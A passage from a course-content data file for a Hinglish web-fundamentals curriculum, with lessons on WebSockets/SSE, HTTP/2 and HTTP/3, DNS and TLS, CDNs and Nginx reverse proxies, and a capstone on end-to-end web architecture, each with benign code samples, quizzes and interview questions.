          storyExplain: 'Polling = Bachha har 1 minute mein mummy se poochta hai: "Khana ban gaya? Khana ban gaya? Khana ban gaya?" (Mummy pareshan). SSE = News TV channel (sirf studio se aapke TV pe broadcast hota hai, aap TV se baat nahi kar sakte). WebSockets = Phone call (dono log ek sath bol aur sun sakte hain real-time)!',
          funnyExample: {
            scenario: 'Agar BGMI / PUBG polling pe chalta, toh tum bullet fire karte, 2 second baad response aata: "Bhai aap 2 second pehle hi mar chuke the!" 😂',
            punchline: 'WebSockets give you sub-10ms multiplayer real-time speed!'
          },
          memoryTrick: 'Real-Time Decision Guide:\n- Live Chat / Multiplayer Game -> WebSockets (Bi-directional, low latency)\n- AI Text Streaming / Stock Ticker / Live Scores -> SSE (Unidirectional, automatic reconnection, HTTP/2 native)\n- Legacy Systems -> Long Polling (Fallback only)',
          visualDiagram: {
            title: 'HTTP Polling vs SSE vs WebSocket Architecture',
            nodes: ['Polling: Request -> Response -> Close (Loop)', 'SSE: Request -> Persistent 1-Way Event Stream', 'WebSocket: HTTP 101 Upgrade -> Persistent 2-Way TCP Socket'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'WebSocket Handshake Under the Hood',
            steps: ['Browser sends: `GET /chat HTTP/1.1` with `Upgrade: websocket` and `Sec-WebSocket-Key`', 'Server responds with: `HTTP/1.1 101 Switching Protocols`', 'TCP connection remains open; switches from HTTP text to lightweight binary framing (2-byte overhead)', 'Both sides send messages freely at any moment']
          },
          code: `// 1. Client-Side WebSockets (Bi-directional)
const socket = new WebSocket('wss://api.codemasti.com/live-chat');

socket.onopen = () => {
  console.log('✅ Connected to live WebSocket server');
  socket.send(JSON.stringify({ type: 'JOIN_ROOM', room: 'frontend' }));
};

socket.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  console.log('📩 Incoming message:', msg);
};

socket.onerror = (err) => console.error('❌ WebSocket error:', err);
socket.onclose = () => console.warn('🔌 Connection closed');

// 2. Client-Side Server-Sent Events (SSE / EventSource)
const eventSource = new EventSource('/api/live-scores');

eventSource.onmessage = (e) => {
  console.log('🏏 Live score update:', e.data);
};

eventSource.addEventListener('wicket', (e) => {
  console.log('🎯 Wicket Event:', e.data);
});`,
          codeBreakdown: [
            { part: 'new WebSocket("wss://...")', label: 'Establishes secure encrypted full-duplex WebSocket connection', color: '#3b82f6' },
            { part: 'new EventSource("/api/live-scores")', label: 'Native browser SSE client with built-in automatic reconnect & event parsing', color: '#10b981' },
            { part: 'eventSource.addEventListener("wicket")', label: 'Listens to named custom SSE event streams', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Using WebSockets for simple unidirectional notifications where SSE would be simpler, support HTTP/2, and auto-reconnect',
            '❌ Forgetting heartbeat / ping-pong frames in WebSockets, causing load balancers or firewalls to silently drop idle connections',
            '❌ Missing reconnect backoff logic when WebSocket connections drop'
          ],
          proTips: [
            '💡 SSE works natively over HTTP/2 multiplexing without burning extra TCP ports',
            '💡 For production WebSockets, use `Socket.io` or `PartyKit` for automatic fallbacks, room management, and horizontal scaling with Redis adapters'
          ],
          interviewQuestions: [
            'What is the difference between WebSockets and Server-Sent Events (SSE)?',
            'How does the HTTP 101 Upgrade handshake work in WebSockets?',
            'How do you scale WebSockets across multiple backend server instances?'
          ],
          miniChallenge: 'Open DevTools Network tab, filter by "WS", reload a live dashboard or Slack/Discord to inspect frame messages.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa protocol server-to-client 1-way streaming ke liye built-in auto-reconnection aur standard HTTP use karta hai?',
            options: ['WebSockets', 'Server-Sent Events (SSE)', 'FTP', 'Short Polling'],
            answer: 'Server-Sent Events (SSE)',
            explanation: 'SSE provides native unidirectional streaming over HTTP with automatic browser reconnection.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'HTTP status code fill karo:',
              sentence: 'WebSocket handshake successful hone par server HTTP status code ___ Switching Protocols return karta hai.',
              answer: '101',
              explanation: 'HTTP 101 indicates the server is switching protocols to WebSocket.'
            }
          ],
          summary: ['Polling is inefficient', 'SSE streams 1-way events over HTTP with automatic reconnection', 'WebSockets provide full-duplex 2-way sub-millisecond communication'],
          flashcard: { q: 'What is Full-Duplex communication?', a: 'Both sender and receiver can transmit and receive data simultaneously without taking turns.' },
          funFact: 'OpenAI ChatGPT web interface streams token completions directly to your browser using Server-Sent Events (SSE)!',
          didYouKnow: 'WebSocket frames have a header overhead of only 2 to 10 bytes, compared to HTTP headers which often exceed 1KB per request.',
          realWorldUseCases: ['Collaborative docs (Google Docs/Figma)', 'Crypto exchange orderbooks', 'Multiplayer gaming', 'AI chat token streaming'],
          practiceQuestions: [
            'Build a simple live chat room using WebSocket server in Node.js',
            'Create an SSE streaming endpoint in Express'
          ]
        },
        {
          id: 'wf-http2-http3-quic',
          title: 'HTTP/1.1 vs HTTP/2 vs HTTP/3 (QUIC & UDP)',
          emoji: '🚀',
          xpReward: 50,
          badgeName: 'Transport Pioneer',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "HTTP/1.1 ka Head-of-Line blocking, HTTP/2 ka multiplexing, aur HTTP/3 ka UDP/QUIC magic! Web speed ka evolution dekho!"',
            hint: '💡 Masti Sir: "HTTP/2 ek hi TCP connection pe saari requests bhejta hai. HTTP/3 TCP ko chhod kar UDP + QUIC pe chalta hai!"',
            success: '🎉 Masti Sir: "Arey waah! Modern transport protocols ka full blueprint ready!"',
            mistake: '😅 Masti Sir: "HTTP/2 aane ke baad CSS sprite sheets ya image inlining ki zaroorat khatam ho gayi — multiplexing sab handle karti hai!"'
          },
          englishDef: 'HTTP/1.1 uses plaintext sequential requests subject to Head-of-Line (HoL) blocking. HTTP/2 introduces binary framing, multiplexing multiple streams over a single TCP connection, and HPACK header compression. HTTP/3 replaces TCP with QUIC over UDP to eliminate transport HoL blocking and enable 0-RTT handshakes.',
          hinglishExplain: 'HTTP/1.1 mein har file (HTML, CSS, JS, Images) ke liye alag request jaati thi aur ek file atki toh peeche wali saari ruk jaati thin (Head-of-Line Blocking). HTTP/2 ne Binary Framing aur Multiplexing laya jahan 100 files ek hi pipe (TCP connection) se parallel mein travel karti hain. HTTP/3 ne TCP ki jagah UDP aur QUIC protocol use kiya, jisse mobile network switch (WiFi -> 4G) hone par bhi connection break nahi hota aur speed bullet train jaisi ho jaati hai!',
          storyExplain: 'HTTP/1.1 = Single lane road (ek car kharab hui toh poora traffic jam). HTTP/2 = 6-lane highway (saari cars parallel chal rahi hain par toll booth ek hi hai). HTTP/3 = Hyperloop rocket pods (har packet independent fly karta hai, bina kisi toll gate ke rukawat ke)!',
          funnyExample: {
            scenario: 'Jab tum ghar se nikalte ho aur phone WiFi se Mobile 5G pe switch hota hai: TCP connection break ho kar dobara handshake karta hai. Par QUIC (HTTP/3) mein Connection ID use hoti hai, isliye video bina 1 second ke buffer ke chalti rehti hai! 📱💨',
            punchline: 'QUIC survives IP network switching seamlessly!'
          },
          memoryTrick: 'Evolution Timeline:\n- HTTP/1.1 (1997): Plaintext, 6 TCP connections per domain, HoL blocking\n- HTTP/2 (2015): Binary format, 1 TCP connection, Multiplexing, HPACK, Server Push\n- HTTP/3 (2022): QUIC over UDP, Zero HoL blocking, 0-RTT Connection Resumption',
          visualDiagram: {
            title: 'HTTP/1.1 vs HTTP/2 vs HTTP/3 Comparison',
            nodes: ['HTTP/1.1: Multiple TCP connections (Slow)', 'HTTP/2: Single TCP Stream Multiplexing', 'HTTP/3: QUIC over UDP (Zero packet loss cascade)'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'How QUIC Achieves 0-RTT Handshake',
            steps: ['Client remembers server cryptographic token from previous session', 'Client sends encryption keys + first HTTP GET data in the very first UDP packet (0-RTT)', 'Server responds immediately with encrypted data', 'Saves 200ms+ round trips compared to classic TCP + TLS handshakes']
          },
          code: `// Inspecting Protocol Version in Browser Console
fetch('https://www.google.com')
  .then(() => {
    // Check performance resource timing entries
    const resources = performance.getEntriesByType('resource');
    resources.forEach(r => {
      console.log(\`📦 Asset: \${r.name.split('/').pop()} | Protocol: \${r.nextHopProtocol}\`);
      // r.nextHopProtocol outputs:
      // 'h2'    -> HTTP/2
      // 'h3'    -> HTTP/3 (QUIC)
      // 'http/1.1' -> HTTP/1.1
    });
  });`,
          codeBreakdown: [
            { part: 'performance.getEntriesByType("resource")', label: 'Reads browser network timing entries directly via Performance API', color: '#3b82f6' },
            { part: 'r.nextHopProtocol', label: 'Returns negotiated ALPN protocol string (e.g. h2 or h3)', color: '#10b981' }
          ],
          commonMistakes: [
            '❌ Domain sharding (splitting assets across cdn1.site.com, cdn2.site.com) in HTTP/2/3 — it hurts performance by opening multiple TCP connections instead of leveraging multiplexing!',
            '❌ Concatenating all JS/CSS into massive single files — in HTTP/2/3, smaller granular modular files cache better'
          ],
          proTips: [
            '💡 Enable HTTP/3 (QUIC) on your Cloudflare / Fastly CDN dashboard with a single toggle',
            '💡 Use HPACK and QPACK header compression to reduce repetitive Cookie and User-Agent overhead'
          ],
          interviewQuestions: [
            'What is Head-of-Line (HoL) Blocking and how does HTTP/3 solve it?',
            'What is Multiplexing in HTTP/2?',
            'Why does HTTP/3 use UDP instead of TCP?'
          ],
          miniChallenge: 'Open Chrome DevTools Network tab, right-click table headers, enable "Protocol" column and see which sites use h2 vs h3.',
          quiz: {
            type: 'mcq',
            question: 'HTTP/3 kaunse transport layer protocol ke upar kaam karta hai?',
            options: ['TCP', 'UDP (QUIC)', 'SCTP', 'IPX'],
            answer: 'UDP (QUIC)',
            explanation: 'HTTP/3 operates over QUIC, which is built on top of UDP to avoid TCP head-of-line blocking.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'Protocol string fill karo:',
              sentence: 'Browser Performance API mein HTTP/2 connection ko ___ kehte hain.',
              answer: 'h2',
              explanation: 'ALPN identifier for HTTP/2 is "h2".'
            }
          ],
          summary: ['HTTP/1.1 had HoL blocking', 'HTTP/2 introduced binary multiplexing over single TCP', 'HTTP/3 uses QUIC over UDP for zero HoL blocking and seamless mobile network roaming'],
          flashcard: { q: 'What is 0-RTT in HTTP/3?', a: 'Zero Round Trip Time connection resumption, allowing clients to send encrypted data in the very first network packet.' },
          funFact: 'Google originally developed QUIC in 2012 as an experimental protocol before IETF standardized it as HTTP/3 in 2022!',
          didYouKnow: 'Over 30% of all global internet traffic already runs on HTTP/3 today (led by Google, Cloudflare, and Meta).',
          realWorldUseCases: ['Mobile app API acceleration', 'High packet-loss wireless connections', 'Zero-latency global video delivery', 'Microservices inter-communication'],
          practiceQuestions: [
            'Inspect HTTP/2 frames in Chrome DevTools using `chrome://net-export`',
            'Benchmark HTTP/2 vs HTTP/3 load times on high-latency networks'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 7: Web Hosting, DNS Architecture & Cloud Edge',
      lessons: [
        {
          id: 'wf-dns-hosting-tls',
          title: 'DNS Records, SSL/TLS Certificates & Web Hosting Architecture',
          emoji: '🌐',
          xpReward: 45,
          badgeName: 'Cloud Master',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Domain khareedne se le kar green padlock (HTTPS) aur production deployment tak ka safar step-by-step seekho!"',
            hint: '💡 Masti Sir: "A Record = Points to IP. CNAME = Points to Domain. TXT = Proves ownership to Google/GitHub!"',
            success: '🎉 Masti Sir: "Hosting aur domain setup ka poora jhamela ab easy lagne laga!"',
            mistake: '😅 Masti Sir: "Free SSL certificate Let\'s Encrypt se milta hai — expired certificate se users ko \'Dangerous Site\' warning dikh jaati hai!"'
          },
          englishDef: 'DNS records route traffic, verify domain ownership, and manage email services. TLS (Transport Layer Security) encrypts communications using asymmetric public/private key pairs and Certificate Authorities (CAs). Modern web hosting spans Static Site Hosting, VPS, and Serverless Edge.',
          hinglishExplain: 'Jab aap domain khareedte ho (jaise codemasti.com), toh DNS settings mein A record se IP jodte ho, CNAME se aliases banate ho aur TXT records se domain ownership verify karte ho. HTTPS ke liye SSL/TLS certificate Let\'s Encrypt ya Cloudflare provide karta hai jo data ko 256-bit AES encryption se safe banata hai. Hosting static (Vercel/Netlify), containerized (Docker on VPS), ya serverless hoti hai.',
          storyExplain: 'Domain = Aapki company ka official signboard. DNS Records = Company ka directory book (A = Building number, MX = Mailroom, TXT = Tax registration certificate). SSL Certificate = Bank-grade digital passport jo verify karta hai ki aap asali company ho, koi duplicate chor nahi!',
          funnyExample: {
            scenario: 'Agar SSL certificate 1 din ke liye bhi expire ho jaye, toh Chrome poori screen pe red warning laga deta hai: "Your connection is not private! Attackers might be trying to steal your passwords!" Users darr ke bhaag jaate hain! 🚨',
            punchline: 'Automate SSL certificate renewals with Certbot / ACME!'
          },
          memoryTrick: 'Core DNS Records:\n- A: Address (Domain -> IPv4)\n- AAAA: IPv6 Address\n- CNAME: Canonical Name (Domain -> Domain alias)\n- MX: Mail Exchange (Email routing)\n- TXT: Text verification (SPF, DKIM, Google/Vercel verify)\n- NS: Name Server (Authority delegator)',
          visualDiagram: {
            title: 'TLS 1.3 Handshake Sequence',
            nodes: ['Client Hello (Supported Ciphers + Key Share)', 'Server Hello + Digital Certificate + Server Key Share', 'Session Keys Derived Instantly', 'Encrypted Application HTTP Data Flows'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Certificate Authority (CA) Chain of Trust',
            steps: ['Browser installs Root CA certificates in OS trust store', 'Server presents certificate signed by Intermediate CA', 'Intermediate CA is verified against trusted Root CA', 'Browser verifies domain name matches certificate Subject Alternative Name (SAN)']
          },
          code: `// Verifying SSL/TLS Certificate Expiration with Node.js
const https = require('https');

function checkCertificateExpiry(hostname) {
  const options = {
    hostname: hostname,
    port: 443,
    method: 'GET',
    rejectUnauthorized: true
  };

  const req = https.request(options, (res) => {
    const cert = res.socket.getPeerCertificate();
    if (cert && cert.valid_to) {
      const expiryDate = new Date(cert.valid_to);
      const daysRemaining = Math.round((expiryDate - new Date()) / (1000 * 60 * 60 * 24));
      console.log(\`🔒 Host: \${hostname}\`);
      console.log(\`🏢 Issuer: \${cert.issuer.O || cert.issuer.CN}\`);
      console.log(\`📅 Valid Until: \${expiryDate.toDateString()}\`);
      console.log(\`⏳ Days Remaining: \${daysRemaining} days\`);
    }
  });

  req.on('error', (e) => console.error('❌ TLS Connection Error:', e.message));
  req.end();
}

checkCertificateExpiry('github.com');`,
          codeBreakdown: [
            { part: 'res.socket.getPeerCertificate()', label: 'Extracts full x509 SSL certificate metadata from active TLS socket', color: '#3b82f6' },
            { part: 'daysRemaining', label: 'Calculates countdown to prevent unexpected certificate expiration', color: '#10b981' }
          ],
          commonMistakes: [
            '❌ Creating multiple A records for the same subdomain pointing to conflicting IPs unintentionally',
            '❌ Forgetting to configure www and non-www redirects (e.g. `codemasti.com` to `https://www.codemasti.com`)',
            '❌ Hardcoding private SSL keys in public GitHub repositories'
          ],
          proTips: [
            '💡 Use Automated SSL (Let\'s Encrypt + Certbot) with auto-renew cron jobs',
            '💡 Enable HSTS (`Strict-Transport-Security`) header to force browsers to always use HTTPS for 2 years'
          ],
          interviewQuestions: [
            'How does Public Key Cryptography work in SSL/TLS handshakes?',
            'What is the difference between an A Record and a CNAME Record?',
            'What is HSTS (HTTP Strict Transport Security)?'
          ],
          miniChallenge: 'Run `openssl s_client -connect google.com:443` in terminal to view the raw cryptographic certificate chain.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa DNS record domain ownership verify karne aur SPF/DKIM email security set karne ke liye use hota hai?',
            options: ['A Record', 'CNAME Record', 'TXT Record', 'PTR Record'],
            answer: 'TXT Record',
            explanation: 'TXT records hold arbitrary text metadata used for domain verification, SPF, and DKIM.'
          },
          miniQuiz: [
            {
              type: 'predict',
              question: 'Agar `app.mysite.com` ko `vercel.app` pe point karna ho toh kaunsa record use hoga?',
              options: ['CNAME', 'A Record', 'MX Record', 'NS Record'],
              answer: 'CNAME',
              explanation: 'CNAME creates an alias from one domain name to another.'
            }
          ],
          summary: ['DNS maps domains to IPs and services via A, CNAME, MX, and TXT records', 'TLS 1.3 provides ultra-fast encrypted communications', 'Certificate Authorities establish a hierarchical chain of trust'],
          flashcard: { q: 'What is Let\'s Encrypt?', a: 'A non-profit Certificate Authority providing free automated X.509 SSL/TLS certificates to the global web.' },
          funFact: 'Over 300 million websites use free SSL certificates issued by Let\'s Encrypt!',
          didYouKnow: 'TLS 1.3 reduced the handshake from 2 round-trips to just 1 round-trip (and 0-RTT on resumption).',
          realWorldUseCases: ['Custom domain setup on Vercel/AWS', 'Email security (SPF/DKIM/DMARC)', 'E-commerce security compliance', 'Subdomain routing'],
          practiceQuestions: [
            'Configure custom domain DNS on Cloudflare or Vercel',
            'Inspect SSL certificate details using Chrome DevTools Security tab'
          ]
        },
        {
          id: 'wf-cdn-edge-caching',
          title: 'CDN Architecture, Edge Computing & Reverse Proxies (Nginx)',
          emoji: '⚡',
          xpReward: 50,
          badgeName: 'Edge Architect',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "USA ka user ho ya India ka, website 50ms mein kaise khulti hai? CDN Edge Servers aur Nginx Reverse Proxies ka kamaal!"',
            hint: '💡 Masti Sir: "Origin server Mumbai mein hai, par CDN data ko Delhi, London, Tokyo ke edge servers pe cache kar deta hai!"',
            success: '🎉 Masti Sir: "Global edge delivery aur reverse proxy architecture complete!"',
            mistake: '😅 Masti Sir: "Static assets pe cache invalidation bhool gaye? Isliye CSS update hone ke baad bhi purani site dikhti hai!"'
          },
          englishDef: 'A CDN (Content Delivery Network) is a geographically distributed network of proxy servers that cache assets close to end users. Reverse Proxies (like Nginx) sit in front of backend web servers to handle SSL termination, load balancing, compression, and rate limiting.',
          hinglishExplain: 'Agar aapka main server (Origin) Mumbai mein hai, aur koi New York se website open kare, toh data aane-jaane mein 300ms lagenge. CDN (jaise Cloudflare ya AWS CloudFront) duniya bhar ke 300+ shehron mein Edge Servers lagata hai. New York ka user New York ke edge se hi static files (JS, CSS, Images) download kar leta hai (5ms). Nginx ek Reverse Proxy hai jo backend servers ke aage khada ho kar traffic distribute karta hai aur SSL handle karta hai.',
          storyExplain: 'Origin Server = Pizza factory Mumbai mein. Bina CDN ke agar London ke bande ko pizza chahiye, toh flight se delivery aayegi (2 din baad). CDN = London, Paris, New York mein local pizza outlets jahan popular pizzas pehle se ready rakhe hain. Order karte hi 10 min mein delivery!',
          funnyExample: {
            scenario: 'Black Friday sale pe 10 lakh users ne ek sath website open ki. Agar CDN na hota toh main database crash ho jata. CDN ne 95% traffic edge pe hi serve kar diya aur backend chill karta raha! 🏖️',
            punchline: '95% CDN cache hit ratio = Happy server, low cloud bills!'
          },
          memoryTrick: 'CDN & Proxy Core Concepts:\n- POP (Point of Presence): Local edge data center\n- Cache Hit: Asset found on edge server (Instant delivery)\n- Cache Miss: Asset fetched from origin and saved to edge\n- Reverse Proxy (Nginx): Protects and scales backends\n- Forward Proxy: Protects clients (VPNs)',
          visualDiagram: {
            title: 'Global CDN Edge Caching Architecture',
            nodes: ['End User (Tokyo)', 'Local Tokyo CDN Edge (POP)', 'Cache Hit -> Instant 10ms response', 'Cache Miss -> Fetch from Origin Server (Mumbai)', 'Edge Caches for Future Users'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Nginx Reverse Proxy Request Lifecycle',
            steps: ['Client sends HTTPS request to domain IP', 'Nginx terminates SSL/TLS and decrypts payload', 'Nginx checks rate limit and security rules', 'Nginx forwards plain HTTP request to internal Node.js port 3000', 'Nginx compresses response (Gzip/Brotli) and streams back to client']
          },
          code: `# Nginx Production Reverse Proxy Configuration (/etc/nginx/nginx.conf)
server {
    listen 80;
    server_name codemasti.com www.codemasti.com;
    return 301 https://$host$request_uri; # Redirect HTTP to HTTPS
}

server {
    listen 443 ssl http2;
    server_name codemasti.com;

    ssl_certificate /etc/letsencrypt/live/codemasti.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/codemasti.com/privkey.pem;

    # Gzip Compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript;

    # Static Assets Caching
    location /static/ {
        root /var/www/codemasti/build;
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # Reverse Proxy API requests to Node.js backend
    location /api/ {
        proxy_pass http://localhost:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}`,
          codeBreakdown: [
            { part: 'proxy_pass http://localhost:5000', label: 'Forwards incoming public traffic to private backend Node.js microservice', color: '#3b82f6' },
            { part: 'add_header Cache-Control "public, immutable"', label: 'Instructs CDNs and browsers to cache versioned assets forever', color: '#10b981' },
            { part: 'proxy_set_header X-Real-IP $remote_addr', label: 'Passes original client IP address to backend for analytics and security', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Not setting `proxy_set_header Host` in Nginx, causing backend routing failures',
            '❌ Forgetting cache-busting hashes in filenames (e.g. `bundle.js` vs `bundle.abc123.js`), leading to stale CDN cache bugs',
            '❌ Confusing a Forward Proxy (client protector/VPN) with a Reverse Proxy (server protector/load balancer)'
          ],
          proTips: [
            '💡 Use Edge Functions (Cloudflare Workers / Vercel Edge) to run personalization, geo-routing, and A/B testing at the edge closest to the user',
            '💡 Monitor `CF-Cache-Status` response header (HIT, MISS, DYNAMIC) to debug CDN behavior'
          ],
          interviewQuestions: [
            'What is the difference between a Forward Proxy and a Reverse Proxy?',
            'How does a CDN determine whether to return a cached copy or fetch from the origin server?',
            'What is Anycast routing and how do CDNs route users to the closest POP?'
          ],
          miniChallenge: 'Inspect response headers of any image on a major website and look for `CF-Cache-Status: HIT` or `x-cache: Hit from cloudfront`.',
          quiz: {
            type: 'mcq',
            question: 'Reverse Proxy (jaise Nginx) ka primary role kya hota hai?',
            options: ['Client identity hide karna', 'Backend servers ke aage load balance, SSL terminate aur traffic route karna', 'Database tables create karna', 'Local browser cookies save karna'],
            answer: 'Backend servers ke aage load balance, SSL terminate aur traffic route karna',
            explanation: 'Reverse Proxies sit in front of servers to handle load balancing, SSL, compression, and caching.'
          },
          miniQuiz: [
            {
              type: 'predict',
              question: 'Agar CDN response header `x-cache: HIT` dikha raha hai, toh request origin server tak gayi?',
              options: ['Haan, hamesha', 'Nahi, Edge server ne local cache se turant return kiya', 'Server crash ho gaya', 'Data delete ho gaya'],
              answer: 'Nahi, Edge server ne local cache se turant return kiya',
              explanation: 'A cache HIT means the edge server satisfied the request without calling the origin.'
            }
          ],
          summary: ['CDNs place edge caches near end users across global POPs', 'Reverse Proxies like Nginx handle SSL termination, load balancing, and caching', 'Edge computing runs serverless logic in under 5ms globally'],
          flashcard: { q: 'What is Anycast DNS?', a: 'A network routing technique where multiple edge servers share the exact same IP address and routers send users to the geographically nearest server.' },
          funFact: 'Cloudflare operates edge data centers in more than 330 cities worldwide, placing 95% of the world population within 50 milliseconds of an edge server!',
          didYouKnow: 'Nginx was created by Igor Sysoev in 2004 specifically to solve the "C10k problem" (handling 10,000 concurrent connections on a single server).',
          realWorldUseCases: ['DDoS mitigation', 'Global static asset acceleration', 'SSL offloading for microservices', 'Geo-distributed video streaming'],
          practiceQuestions: [
            'Set up a basic Nginx reverse proxy routing to a local Node.js app',
            'Inspect Cloudflare edge cache response headers'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 8: Web Fundamentals Capstone & FAANG Interview Prep',
      lessons: [
        {
          id: 'wf-complete-web-architecture',
          title: 'Complete End-to-End Web Architecture Blueprint & Interview Masterclass',
          emoji: '🏆',
          xpReward: 60,
          badgeName: 'Web Architect Grandmaster',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Aapne Web Fundamentals ka poora brahmand master kar liya hai! URL type karne se le kar render, security, protocols aur CDN tak ka 100% complete synthesis!"',
            hint: '💡 Masti Sir: "Interview mein jab puchein \'What happens when you type a URL?\', toh is 8-step structured formula se FAANG interviewers ko impress karo!"',
            success: '🎉 Masti Sir: "Mubarak ho! Web Fundamentals Masterclass fully completed! You are now an Elite Web Engineer!"',
            mistake: '😅 Masti Sir: "Interview mein superficial answer mat do — DNS, TCP, TLS 1.3, HTTP/2, DOM/CSSOM Render Tree aur GPU Compositor sab mention karo!"'
          },
          englishDef: 'The ultimate synthesis of modern web engineering: URL parsing, Multi-tier DNS resolution, TCP 3-way handshake, TLS 1.3 key exchange, HTTP/2/3 request multiplexing, Edge CDN routing, Server Reverse Proxy processing, Browser Critical Rendering Path, and Lifecycle management.',
          hinglishExplain: 'Ye Web Fundamentals ka complete master blueprint hai. Jab user `https://codemasti.com` type karta hai: 1. Browser URL parse karta hai -> 2. DNS resolver IP nikalta hai -> 3. TCP + TLS 1.3 Handshake se encrypted connection banta hai -> 4. CDN Edge cache check hota hai -> 5. Nginx reverse proxy backend ko forward karta hai -> 6. Browser HTML/CSS/JS download karta hai -> 7. DOM + CSSOM se Render Tree ban kar GPU screen pe draw karta hai -> 8. Event Loop aur Service Workers offline & real-time updates handle karte hain!',
          storyExplain: 'Ye bilkul ek Rocket Launch jaisa hai. Har stage (Fuel, Guidance, Engine, Satellite orbit) perfect synchrony mein kaam karti hai. Ek single web page load hone ke peeche 50 saal ki computer science engineering aur hazaron protocols ka symphony hai!',
          funnyExample: {
            scenario: 'Interviewer ne pucha: "Tell me what happens when you type google.com."\nCandidate: "Page load ho jata hai sir!" (Rejected ❌)\nCodeMasti Student: "DNS resolution through recursive tree, TCP 3-way handshake, TLS 1.3 0-RTT, HTTP/2 multiplexing, CRP pipeline with DOM/CSSOM, Layout, Paint, and GPU Compositing!" Interviewer: "You are hired at L6 Staff Engineer!" (Selected 🚀)',
            punchline: 'Deep fundamental clarity separates junior coders from world-class architects!'
          },
          memoryTrick: 'The 8-Stage Master Blueprint:\n1. URL Parsing & HSTS Check\n2. DNS Resolution (Browser -> OS -> Resolver -> Root/TLD/Auth)\n3. TCP Handshake + TLS 1.3 Cryptographic Exchange\n4. CDN Edge / Reverse Proxy Routing (HTTP/2 or HTTP/3)\n5. Server Processing (Auth, Cookies, Database)\n6. Response Transmission & Cache-Control\n7. Critical Rendering Path (DOM -> CSSOM -> Render Tree -> Layout -> Paint -> Composite)\n8. Asynchronous Execution (Event Loop, WebSockets, Storage)',
          visualDiagram: {
            title: 'End-to-End Complete Web Architecture Lifecycle',
            nodes: ['User Types URL', 'DNS Resolution', 'TCP & TLS 1.3 Handshake', 'CDN Edge Caching', 'Nginx Reverse Proxy', 'Browser Rendering Engine (DOM/CSSOM)', 'Interactive 60fps Web App'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Complete 25 Top Web Fundamentals Interview Q&A Cheatsheet',
            steps: [
              'Q1: TCP vs UDP -> Reliable ordered vs fast connectionless',
              'Q2: HTTP/1 vs HTTP/2 vs HTTP/3 -> Text sequential vs Binary multiplexed vs QUIC UDP',
              'Q3: LocalStorage vs IndexedDB -> 5MB sync string vs GBs async NoSQL',
              'Q4: XSS vs CSRF -> Script execution vs Unauthorized request forgery',
              'Q5: SOP vs CORS -> Default cross-origin block vs Server-controlled access whitelist'
            ]
          },
          code: `// Capstone Web Architecture Diagnostic Health Checker
async function diagnoseWebEndpoint(targetUrl) {
  console.log(\`🌐 Starting End-to-End Architecture Audit for: \${targetUrl}\`);
  const marks = {
    start: performance.now()
  };

  try {
    const response = await fetch(targetUrl, { method: 'GET' });
    marks.responseEnd = performance.now();

    const ttfb = (marks.responseEnd - marks.start).toFixed(2);
    console.log(\`⚡ Time to First Byte (TTFB): \${ttfb}ms\`);
    console.log(\`📡 HTTP Status: \${response.status} \${response.statusText}\`);
    console.log(\`🔒 Security Headers:\`);
    console.log(\`   - Strict-Transport-Security: \${response.headers.get('strict-transport-security') || 'Missing ⚠️'}\`);
    console.log(\`   - Content-Security-Policy: \${response.headers.get('content-security-policy') ? 'Active ✅' : 'Missing ⚠️'}\`);
    console.log(\`   - Cache-Control: \${response.headers.get('cache-control') || 'None'}\`);
    console.log(\`   - Server / CDN: \${response.headers.get('server') || 'Hidden for security'}\`);
    
    return { success: true, ttfb, status: response.status };
  } catch (err) {
    console.error('❌ Connection Diagnostics Failed:', err.message);
    return { success: false, error: err.message };
  }
}

diagnoseWebEndpoint('https://api.github.com');`,
          codeBreakdown: [
            { part: 'diagnoseWebEndpoint()', label: 'Comprehensive auditing function measuring TTFB, status codes, and security headers', color: '#3b82f6' },
            { part: 'strict-transport-security', label: 'Verifies HSTS protection against SSL stripping attacks', color: '#10b981' },
            { part: 'content-security-policy', label: 'Verifies client-side XSS defense policy presence', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Forgetting that modern web performance requires optimizing BOTH network latency (TTFB/CDN) and browser main-thread rendering (Reflow/JS)',
            '❌ Neglecting security headers in production deployments'
          ],
          proTips: [
            '💡 Always use web.dev / PageSpeed Insights and WebPageTest.org for real-world lab & field data diagnostics',
            '💡 Practice diagramming the complete request-to-render architecture on a whiteboard before technical system interviews'
          ],
          interviewQuestions: [
            'Give a comprehensive end-to-end explanation of what happens from the moment a user types a URL in a browser until the page is fully interactive.',
            'How do modern CDNs, Reverse Proxies, and Edge Workers optimize latency for international users?',
            'What are the core security headers every production web app must implement?'
          ],
          miniChallenge: 'Run the diagnostic health checker code snippet on 3 of your favorite websites in DevTools console and compare their security headers.',
          quiz: {
            type: 'mcq',
            question: 'End-to-end web architecture mein server ke plain HTTP microservices ke aage public HTTPS terminate karne wali layer ko kya kehte hain?',
            options: ['Forward Proxy', 'Reverse Proxy (e.g. Nginx / Caddy)', 'Browser Engine', 'DNS Resolver'],
            answer: 'Reverse Proxy (e.g. Nginx / Caddy)',
            explanation: 'Reverse proxies sit in front of backend servers to terminate TLS, load balance, compress, and route traffic.'
          },
          miniQuiz: [
            {
